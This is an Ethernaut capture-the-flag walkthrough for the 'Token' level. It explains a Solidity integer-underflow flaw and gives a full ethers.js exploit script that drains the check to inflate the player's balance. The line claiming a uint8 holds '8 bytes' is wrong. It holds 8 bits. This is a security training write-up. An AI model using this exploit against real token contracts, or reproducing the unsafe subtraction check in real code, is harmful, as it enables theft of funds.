---
description: >-
  In Ethernaut's Token, we have our assumptions about unsigned integers
  challenged.
---

# 5 - Token

In [this level](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE) we are given 20 tokens and tasked with obtaining more.

### Hints

<details>

<summary>Hint One</summary>

The thing to keep in mind about this level is we're being asked to transfer _more_ _tokens_ than we actually have.

</details>

<details>

<summary>Hint Two</summary>

How might Solidity handle a "negative" unsigned integer?

</details>

### Full Walkthrough

The contract's `transfer` function requires that the requested amount of tokens to transfer is not greater than the total balance of the message sender's account. This check, however, has been  implemented in an unsafe way.&#x20;

```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

In Solidity versions prior to 0.8.0, `uint` types were susceptible to **overflow** and **underflow**. This means that when their value was incremented or decremented outside the bounds of what their size could contain, the value would simply roll over or roll under, like an odometer.

{% hint style="info" %}
**Overflow and Underflow**

In integer overflow, once an unsigned integer reaches its maximum byte size, the next element added will return the first variable element. For example, a `uint8` can hold 8 bytes of data, meaning it can store any number between 0 and 255. If a `uint8` has the value of 255 and 1 is added to it, it will _overflow_ to 0.

Underflow is just the opposite, if a `uint8` has the value of 0 and 1 is subtracted from it, it will _underflow_ to 255.
{% endhint %}

Because the require statement subtracts `_value` from `balances[msg.sender]`, if we simply supply a value that is greater than the balance, the result of the subtraction will underflow, in this case to 2\*\*256 - 1. We just need to transfer this value to any address other than our own and our account balance becomes the result of the underflow, an enormous number of tokens!&#x20;

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const {
    playerWallet,
    contract: tokenContract,
  } = await setup('Token')

  // Get player address initial balance
  const playerAddressBalance = await tokenContract.balanceOf(
    playerWallet.address
  )
  console.log(`Player address initial balance: ${playerAddressBalance}.`)

  // Transfer balance + 1 tokens to a random wallet
  const tokensToTransfer = Number(playerAddressBalance) + 1
  console.log(`Transferring ${tokensToTransfer} tokens to player address...`)
  await tokenContract.transfer(process.env.RANDOM_ADDRESS, tokensToTransfer)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```

### Key Takeaways

* In older versions of Solidity, **uint** types were vulnerable to value **overflow** and **underflow**.
